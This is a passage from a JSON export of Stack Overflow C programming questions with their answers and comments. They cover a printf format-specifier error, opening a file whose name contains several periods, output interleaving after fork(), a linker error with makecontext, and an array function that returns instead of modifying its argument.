[{"tags": ["c", "printf"], "comments": [{"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 5, "creation_date": 1544658006, "post_id": 53753022, "comment_id": 94358913, "body": "On the end the <code>%l}</code> is not a valid conversion. You probably meant to <code>%ld}</code>. This you have 4 conversion specifiers (ie. <code>%d</code> or similar) in printf and 6 arguments. Thus you have one argument more then conversion specifiers."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1544674187, "post_id": 53753022, "comment_id": 94362360, "body": "Invalid conversion specifier, behaviour is undefined."}], "answers": [{"comments": [{"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 2, "creation_date": 1544658505, "post_id": 53753086, "comment_id": 94359044, "body": "all OP really had to do was read the first error message"}], "tags": [], "owner": {"reputation": 1305, "user_id": 8691102, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FAZ_pZZwOOs/AAAAAAAAAAI/AAAAAAAABM4/i17A8WZTujA/photo.jpg?sz=128", "display_name": "Mahdi Ghajary", "link": "https://stackoverflow.com/users/8691102/mahdi-ghajary"}, "is_accepted": true, "score": 1, "last_activity_date": 1544658366, "creation_date": 1544658366, "answer_id": 53753086, "question_id": 53753022, "link": "https://stackoverflow.com/questions/53753022/cant-find-issue-with-too-many-arguments-for-format/53753086#53753086", "title": "Can&#39;t find issue with &quot;Too many arguments for format&quot;", "body": "<p>all you have to do is correct the <code>%l</code>(there is not such a specifier), you probably should have used <code>%ld</code>.  </p>\n\n<pre><code>char *buildStatus()\n{\n   struct rusage *usage = malloc(sizeof(struct rusage));\n   int usageRet = getrusage(RUSAGE_SELF, usage);\n   if (usageRet == -1)\n   {\n      perror(\"RUSAGE fail\");\n      exit(EXIT_FAILURE);\n   }\n   long unsigned cpuTime = (usage-&gt;ru_utime).tv_sec + (usage-&gt;ru_stime).tv_sec;\n   long memUsed = get_memory_usage_linux();\n   unsigned int uptime = 0;\n\n   char *message = malloc(1000);\n   sprintf(message, \"{\\\"num_clients\\\": %d,\\\"num_requests\\\": %d,\\\"errors\\\": %d,\\\"uptime\\\": %u,\\\"cpu_time\\\": %lu,\\\"memory_used\\\": %ld}\", (numConnections+1), numRequests, numErrors, uptime, cpuTime, memUsed);\n   free(usage);\n   return message;\n}\n</code></pre>\n\n<p>hope that helps. </p>\n"}], "owner": {"reputation": 1, "user_id": 6732752, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh5.googleusercontent.com/-0jm2TEKtrlU/AAAAAAAAAAI/AAAAAAAAAfI/7HiEJMQrkYo/photo.jpg?sz=128", "display_name": "Daniel Kasman", "link": "https://stackoverflow.com/users/6732752/daniel-kasman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "closed_date": 1544681365, "accepted_answer_id": 53753086, "answer_count": 1, "score": -5, "last_activity_date": 1544658366, "creation_date": 1544657856, "question_id": 53753022, "link": "https://stackoverflow.com/questions/53753022/cant-find-issue-with-too-many-arguments-for-format", "closed_reason": "Not suitable for this site", "title": "Can&#39;t find issue with &quot;Too many arguments for format&quot;", "body": "<p>I am having trouble with my sprintf statement. I see 6 argument formats and 6 supplied arguments, but I am getting the following error:</p>\n\n<blockquote>\n  <p>jsonServer.c:450:4: error: unknown conversion type character \u2018}\u2019 in\n  format [-Werror=format=]<br>\n  sprintf(message, \"{\\\"num_clients\\\": %d,\\\"num_requests\\\":\n  %d,\\\"errors\\\": %d,\\\"uptime\\\": %u,\\\"cpu_time\\\": %lu,\\\"memory_used\\\":\n  %l}\", (numConnections+1), numRequests, numErrors, uptime, cpuTime,\n  memUsed);<br>\n  jsonServer.c:450:4: error: too many arguments for format\n  [-Werror=format-extra-args]</p>\n</blockquote>\n\n<pre><code>char *buildStatus()\n{\n   struct rusage *usage = malloc(sizeof(struct rusage));\n   int usageRet = getrusage(RUSAGE_SELF, usage);\n   if (usageRet == -1)\n   {\n      perror(\"RUSAGE fail\");\n      exit(EXIT_FAILURE);\n   }\n   long unsigned cpuTime = (usage-&gt;ru_utime).tv_sec + (usage-&gt;ru_stime).tv_sec;\n   long memUsed = get_memory_usage_linux();\n   unsigned int uptime = 0;\n\n   char *message = malloc(1000);\n   sprintf(message, \"{\\\"num_clients\\\": %d,\\\"num_requests\\\": %d,\\\"errors\\\": %d,\\\"uptime\\\": %u,\\\"cpu_time\\\": %lu,\\\"memory_used\\\": %l}\", (numConnections+1), numRequests, numErrors, uptime, cpuTime, memUsed);\n   free(usage);\n   return message;\n}\n</code></pre>\n\n<p>I think there is some sneaky escape character issue, but after sticking backslashes everywhere, I can't seem to fix it.</p>\n"}, {"tags": ["c", "fopen"], "comments": [{"owner": {"reputation": 813, "user_id": 7007547, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/98f73030359d42f11fdc0a2893f809b5?s=128&d=identicon&r=PG&f=1", "display_name": "mbieren", "link": "https://stackoverflow.com/users/7007547/mbieren"}, "edited": false, "score": 3, "creation_date": 1544655896, "post_id": 53752709, "comment_id": 94358275, "body": "on windows or linux ? double check those filenames"}, {"owner": {"reputation": 813, "user_id": 7007547, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/98f73030359d42f11fdc0a2893f809b5?s=128&d=identicon&r=PG&f=1", "display_name": "mbieren", "link": "https://stackoverflow.com/users/7007547/mbieren"}, "edited": false, "score": 1, "creation_date": 1544655930, "post_id": 53752709, "comment_id": 94358292, "body": "esp with show file extension off/on in the windooze explorer"}, {"owner": {"reputation": 3783, "user_id": 2428235, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sj48p.jpg?s=128&g=1", "display_name": "Roman Hocke", "link": "https://stackoverflow.com/users/2428235/roman-hocke"}, "edited": false, "score": 3, "creation_date": 1544655935, "post_id": 53752709, "comment_id": 94358294, "body": "Does the renamed file exist? Check <code>errno</code>."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 7, "creation_date": 1544655943, "post_id": 53752709, "comment_id": 94358296, "body": "Use <code>perror</code> as it will tell you much more than simply shouting &quot;ERROR!&quot; at you."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1544656441, "post_id": 53752709, "comment_id": 94358455, "body": "<code>char nome_fich[] = &quot;text.cir.txt&quot;;</code> and <code>fopen(&quot;text.cir.txt&quot;, &quot;r&quot;);</code> looks like an opportunity for confusion.  Drop the <code>char nome_fich[] = &quot;text.cir.txt&quot;;</code>  and test your compilations/runs again."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1544670311, "post_id": 53752709, "comment_id": 94361563, "body": "OT: regarding: <code>printf(&quot;ERROR&quot;);</code>  error messages should be output to <code>stderr</code>, not <code>stdout</code>  and when the error indication is from a C library function, should also output the text reason the system thinks the error occurred.  Suggest: <code>perror(&quot;fopen failed&quot;);</code>  does all of the above correctly"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544670469, "post_id": 53752709, "comment_id": 94361608, "body": "OT:  in general, the letters: <code>fd</code> are typically used for a file descriptor number and <code>fp</code> are typically used for a file pointer.  Note: <code>fopen()</code> returns a file pointer while <code>open()</code> returns a file descriptor number"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 2, "creation_date": 1544670617, "post_id": 53752709, "comment_id": 94361647, "body": "the posted code does not compile.  Amongst other things, it is missing the <code>#include</code> statements for the needed header files and it is missing any function, like <code>main()</code>"}], "answers": [{"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 1, "last_activity_date": 1544671288, "creation_date": 1544671288, "answer_id": 53754565, "question_id": 53752709, "link": "https://stackoverflow.com/questions/53752709/c-file-name-with-multiple-periods/53754565#53754565", "title": "C File Name with multiple periods", "body": "<p>the following proposed code:</p>\n\n<ol>\n<li>cleanly compiles</li>\n<li>performs the desired functionality</li>\n<li>properly checks for and handles errors</li>\n</ol>\n\n<p>and now, the proposed code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;    // FILE, fopen(), perror(), printf()\n#include &lt;stdlib.h&gt;   // exit(), EXIT_FAILURE\n\nint main( void )\n{\n    FILE *fd = fopen( \"text.cir.txt\", \"r\" );\n\n    if ( !fd )\n    {\n        perror( \"fopen failed\" );\n        exit( EXIT_FAILURE );\n    }\n\n    // implied else, fopen successful\n\n    int x;\n    while ((x = fgetc(fd)) != EOF)\n    {\n        printf(\"%c\", x);\n    }\n    fclose(fd);\n}\n</code></pre>\n\n<p>when run against any .txt file, it performs the desired operation.</p>\n\n<p>Note: I'm running Linux version 18.04</p>\n"}], "owner": {"reputation": 7, "user_id": 10783311, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-yp6F8EjEsHk/AAAAAAAAAAI/AAAAAAAAAbE/n3xtNBfIVvg/photo.jpg?sz=128", "display_name": "rui gomes", "link": "https://stackoverflow.com/users/10783311/rui-gomes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1544671288, "creation_date": 1544655716, "question_id": 53752709, "link": "https://stackoverflow.com/questions/53752709/c-file-name-with-multiple-periods", "title": "C File Name with multiple periods", "body": "<p>Simple question.</p>\n\n<p>When I try to open a file with the name text.txt it works properly. </p>\n\n<p>However if I rename the file to text.cir.txt it gives me ERROR.</p>\n\n<p>What can I do to fix it?</p>\n\n<pre><code>FILE *fd;\nchar nome_fich[] = \"text.cir.txt\";\nint x;\nfd = fopen(\"text.cir.txt\", \"r\");\n\nif (fd == NULL)\n{\n    printf(\"ERROR\");\n}\nelse\n{\n    while ((x = fgetc(fd)) != EOF)\n    {\n        printf(\"%c\", x);\n    }\n    fclose(fd);\n}\n</code></pre>\n"}, {"tags": ["c", "windows", "visual-studio", "fork"], "comments": [{"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 2, "creation_date": 1544653490, "post_id": 53752283, "comment_id": 94357407, "body": "Post code, not pictures of code."}, {"owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "reply_to_user": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1544653668, "post_id": 53752283, "comment_id": 94357466, "body": "Sorry, will do."}, {"owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "reply_to_user": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1544654321, "post_id": 53752283, "comment_id": 94357736, "body": "Also, I cannot use | cat because I am on windows environment, I&#39;m not on linux / unix system , as when I try to do &quot;./f | cat &quot; I get the following error: &quot; InputObjectNotBound,Microsoft.PowerShell.Commands.GetContent&zwnj;&#8203;Command&quot; as Expected"}, {"owner": {"reputation": 129, "user_id": 4187641, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/515988629/picture?type=large", "display_name": "Bregell", "link": "https://stackoverflow.com/users/4187641/bregell"}, "edited": false, "score": 1, "creation_date": 1544654895, "post_id": 53752283, "comment_id": 94357947, "body": "Can&#39;t seem to replicate: <a href=\"https://rextester.com/XRA51984\" rel=\"nofollow noreferrer\">rextester.com/XRA51984</a>"}, {"owner": {"reputation": 1466, "user_id": 810658, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/62139de5517901ce4c7ba8184070d24f?s=128&d=identicon&r=PG", "display_name": "Philip", "link": "https://stackoverflow.com/users/810658/philip"}, "edited": false, "score": 1, "creation_date": 1544655654, "post_id": 53752283, "comment_id": 94358202, "body": "Yeah good luck replicating a race condition exactly."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544655971, "post_id": 53752283, "comment_id": 94358306, "body": "Jessica Pereira, Although I would not expect a difference, does <code>puts(&quot;xxx&quot;);</code> perform differently than <code>printf(&quot;xxx\\n&quot;);</code> on your machine?"}, {"owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544657903, "post_id": 53752283, "comment_id": 94358884, "body": "@chux performs the same. &quot;fork(); puts(&quot;Show me the new line before the pid child dies&quot;);&quot; gives: &quot;string1 string2\\n&quot; on terminal , and string1 \\n string2 \\n on the file output ^^"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544659497, "post_id": 53752283, "comment_id": 94359320, "body": "Jessica Pereira, Does the first give &quot;string1 string2 \\n&quot; or &quot;string1 string2 \\n\\n&quot;?  (Details on spaces and <code>&#39;\\n&#39;</code>)"}], "answers": [{"comments": [{"owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "edited": false, "score": 0, "creation_date": 1544655389, "post_id": 53752613, "comment_id": 94358113, "body": "Well, that will not result on my expected output. Instead I have the following: &gt;./f &gt;Show me the new line before the pid child dies &gt;Show me the new line before the pid child dies &gt;  So, it does it 4x now, and it waits 1 second between the first and the second &quot;print&quot; after the first \\n (between 2nd and 3rd &#39;&gt;&#39;)"}, {"owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "edited": false, "score": 0, "creation_date": 1544655674, "post_id": 53752613, "comment_id": 94358212, "body": "This is actually interesting / confusing / weird, now that I just changed the code to what you said, which is:   if(fork()){         sleep(1);     }  it prints 4 times what should have be printed only 2 times... but thanks for your answer, I am feeling like &quot;the more I know, the more I realize I don&#39;t know&quot; kind of vibe which is good ahha @exebook"}, {"owner": {"reputation": 27031, "user_id": 1968972, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/bfdd4ec8dff5c7635520fe98348524ec?s=128&d=identicon&r=PG", "display_name": "exebook", "link": "https://stackoverflow.com/users/1968972/exebook"}, "reply_to_user": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "edited": false, "score": 1, "creation_date": 1544656075, "post_id": 53752613, "comment_id": 94358337, "body": "Did you add my line or have you replaced your simple call to fork with my line? Maybe you now have two calls to <code>fork()</code> instead of one."}, {"owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "edited": false, "score": 0, "creation_date": 1544656221, "post_id": 53752613, "comment_id": 94358386, "body": "Nope. Only one call of fork, inside the if() block."}, {"owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "edited": false, "score": 0, "creation_date": 1544656954, "post_id": 53752613, "comment_id": 94358599, "body": "EXACTLY!!!!!!! @exebook YOU ARE AMAZING THANK YOU SO MUCH :)  Can you just answer my (I know it will be a - ) dumb question xD , when you check if fork() != 0, you are checking if the fork() is not the parent, therefore if it is not the parent , It is then the child, and if it is the child then I want to wait for the child to die, is that it? (parent will be fork() == 0 )"}, {"owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "edited": false, "score": 1, "creation_date": 1544657045, "post_id": 53752613, "comment_id": 94358631, "body": "with that update, it works both for the console (buffer stdout terminal ) and output file. Once again, thank you @exebook"}, {"owner": {"reputation": 27031, "user_id": 1968972, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/bfdd4ec8dff5c7635520fe98348524ec?s=128&d=identicon&r=PG", "display_name": "exebook", "link": "https://stackoverflow.com/users/1968972/exebook"}, "reply_to_user": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "edited": false, "score": 0, "creation_date": 1544688095, "post_id": 53752613, "comment_id": 94366872, "body": "In this example function <code>wait</code> is called in the parent only. Fork returns zero to a child, and a numeric ID of a child to a parent. <code>wait(NULL)</code> will wait untill all children exit. Instead you could save the returned id in a variable and then give that variable to <code>wait</code>. You could (and probably should have) read the docs for both fork and wait. Also known as mans. But I know how difficult they are to read for a newbie."}], "tags": [], "owner": {"reputation": 27031, "user_id": 1968972, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/bfdd4ec8dff5c7635520fe98348524ec?s=128&d=identicon&r=PG", "display_name": "exebook", "link": "https://stackoverflow.com/users/1968972/exebook"}, "is_accepted": true, "score": 2, "last_activity_date": 1544656384, "last_edit_date": 1544656384, "creation_date": 1544655099, "answer_id": 53752613, "question_id": 53752283, "link": "https://stackoverflow.com/questions/53752283/how-to-print-n-on-a-string-during-a-child-process-on-a-fork/53752613#53752613", "title": "How to print \\n on a string during a child process on a fork", "body": "<p>Probably you got a racing condition, after the call to <code>fork()</code> both the parent thread and the child thread are trying to print simultaneously. The behavior in this case is undefined. The whole idea of homework is probably to teach you that. You should use some sort of inter thread communication, or simply wait in the parent process (or in child it does not matter).</p>\n\n<p><code>if (fork()) sleep(1);</code></p>\n\n<p>Update:</p>\n\n<p>After carefully reading your output line I realised that your exercise is probably to learn to wait in the parent process until the child dies, this is achieved like this:</p>\n\n<p><code>if (fork() != 0) wait(NULL);</code></p>\n"}, {"tags": [], "owner": {"reputation": 1466, "user_id": 810658, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/62139de5517901ce4c7ba8184070d24f?s=128&d=identicon&r=PG", "display_name": "Philip", "link": "https://stackoverflow.com/users/810658/philip"}, "is_accepted": false, "score": 1, "last_activity_date": 1544655397, "creation_date": 1544655397, "answer_id": 53752657, "question_id": 53752283, "link": "https://stackoverflow.com/questions/53752283/how-to-print-n-on-a-string-during-a-child-process-on-a-fork/53752657#53752657", "title": "How to print \\n on a string during a child process on a fork", "body": "<p>Typical concurrency problem. Enforce correct multi-threaded behavior and eliminate race conditions with mutex locks and the like.  </p>\n\n<p>Per POSIX and ISO, stdout buffers output until it hits a newline or explicitly flushes, which takes time and the race condition bites you. If you're redirecting to a file, std behaves differently.   The newline gets into the buffer but doesn't kick off a flush, while the explicit <code>fflush</code> will force it, so printf concludes and the children don't bump each other until the middle of <code>fflush</code> but your buffer is set up as you want by then.   You probably shouldn't depend on that timing happening like that. </p>\n"}], "owner": {"reputation": 81, "user_id": 7613611, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XBGCE.png?s=128&g=1", "display_name": "Jess", "link": "https://stackoverflow.com/users/7613611/jess"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 0, "accepted_answer_id": 53752613, "answer_count": 2, "score": 3, "last_activity_date": 1544656384, "creation_date": 1544653323, "last_edit_date": 1544655488, "question_id": 53752283, "link": "https://stackoverflow.com/questions/53752283/how-to-print-n-on-a-string-during-a-child-process-on-a-fork", "title": "How to print \\n on a string during a child process on a fork", "body": "<p>My code:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(){\n    fork();\n    printf(\"Show me the new line before the pid child dies \\n\");\n    return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>&gt;Show me the new line before the pid child dies Show me the new line before the pid child dies\"\\n\n&gt;\n</code></pre>\n\n<p>My expected result would be to show the '\\n' as part of the string and to have two separate lines, as below:</p>\n\n<pre><code>&gt;string1 \\n\n&gt;string2 \\n\n&gt;\n</code></pre>\n\n<p>but I am getting the following:</p>\n\n<pre><code>&gt;string1 string2 \\n\n&gt;\n</code></pre>\n\n<p>I tried with the fflush(stdout) but didn't make a difference.</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(){\n    fork();\n    printf(\"Show me the new line before the pid child dies \\n\");\n    fflush(stdout);\n    return 0;\n}\n</code></pre>\n\n<p>Same output:</p>\n\n<pre><code>&gt;\"Show me the new line before the pid child dies Show me the new line before the pid child dies\"\n&gt;\n</code></pre>\n\n<p>How do I make it so I get the following output:</p>\n\n<pre><code>&gt;\"Show me the new line before the pid child dies \\n\"\n&gt; Show me the new line before the pid child dies \\n\"\n&gt;\n</code></pre>\n\n<hr>\n\n<p>Update:</p>\n\n<p>If I run it as below, it shows me the correct lines (as I wanted):</p>\n\n<p>Command on terminal / powershell</p>\n\n<pre><code> .\\f.exe &gt; f.out\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>1 Show me the new line before the pid child dies \n2 Show me the new line before the pid child dies \n3 \n</code></pre>\n\n<p>I am changing my question then: Can I actually get the exact same output shown on my terminal (vs code / powershell), as I am getting on my f.out file?</p>\n\n<p>I'm running MS Visual Studio on Windows.</p>\n"}, {"tags": ["c", "terminal"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1544650612, "post_id": 53751641, "comment_id": 94356105, "body": "You appear to have spelled the function names incorrectly.  They do not use camelCase: <code>makecontext()</code> and <code>swapcontext()</code>.  Do note that these functions are no longer standard, however, having been removed from the 2008 revision of POSIX.1."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544671578, "post_id": 53751641, "comment_id": 94361866, "body": "the posted code is missing anything that will cause a compile problem.  AND since your &#39;compile&#39; statement is missing the option &#39;-c&#39; it will also try to perform the link step."}], "owner": {"reputation": 11, "user_id": 10783028, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-I732ke4cnLc/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iFU1ZO_Hz6wya5VmKfZJ5GhHzmCQ/mo/photo.jpg?sz=128", "display_name": "Cole Beiermann", "link": "https://stackoverflow.com/users/10783028/cole-beiermann"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 152, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1544650166, "creation_date": 1544650166, "question_id": 53751641, "link": "https://stackoverflow.com/questions/53751641/how-to-fix-error-message-undefined-symbols-for-architecture-x86-64-in-c", "title": "How to fix error message &quot;Undefined symbols for architecture x86_64:&quot; in C?", "body": "<p>I'm currently getting the error:</p>\n\n<p>Undefined symbols for architecture x86_64:\n  \"_makeContext\", referenced from:\n      _main in myThread-68b6d3.o\nld: symbol(s) not found for architecture x86_64</p>\n\n<p>This error only occurs when I use the function makeContext or swapContext from ucontext.h</p>\n\n<p>Here's what the head of my code looks like:</p>\n\n<pre><code>#define _XOPEN_SOURCE 600\n\n#include &lt;unistd.h&gt;\n#include &lt;ucontext.h&gt;\n//#include &lt;sys/ucontext.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n#include &lt;sys/time.h&gt;\n</code></pre>\n\n<p>I'm in terminal and I'm using this to compile:</p>\n\n<pre><code>gcc -w myThread.c -o myThread\n</code></pre>\n\n<p>My code will compile if I comment out all makeContext and swapContext functions. It works fine for the other function in  like getContext and setContext.</p>\n\n<p>Any idea on how to remove this error?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 199, "user_id": 3541440, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0cjHH.jpg?s=128&g=1", "display_name": "Jenny T-Type", "link": "https://stackoverflow.com/users/3541440/jenny-t-type"}, "edited": false, "score": 2, "creation_date": 1544650843, "post_id": 53751593, "comment_id": 94356213, "body": "let&#39;s see, you pass an array to a function, then, using the array you just passed you update your <code>int sub</code> variable to reflect your calculation, the return <code>sub</code> you do nothing with the result value, then print the array you never modified."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544650894, "post_id": 53751593, "comment_id": 94356238, "body": "You seem to expect your function to modify the array provided as its argument, but instead it returns its (scalar) result via a <code>return</code> statement, leaving the array unmodified."}, {"owner": {"reputation": 1619, "user_id": 7864413, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208517922736756/picture?type=large", "display_name": "Phil M", "link": "https://stackoverflow.com/users/7864413/phil-m"}, "edited": false, "score": 0, "creation_date": 1544650896, "post_id": 53751593, "comment_id": 94356240, "body": "Different problem, but note that taking the absolute value of the result of a subtraction is not the same as subtracting the absolute value of both operands."}, {"owner": {"reputation": 1619, "user_id": 7864413, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208517922736756/picture?type=large", "display_name": "Phil M", "link": "https://stackoverflow.com/users/7864413/phil-m"}, "edited": false, "score": 0, "creation_date": 1544651082, "post_id": 53751593, "comment_id": 94356334, "body": "And, I don&#39;t think the expected output of <code>0 0 0 1 1 22</code> at all matches the behavior you describe for an input of <code>1 2 55 56 65 135</code>. 135 - 65 is not 22, to start."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544651237, "post_id": 53751593, "comment_id": 94356417, "body": "The function implementation seems designed to solve the problem for <i>one</i> number that has been 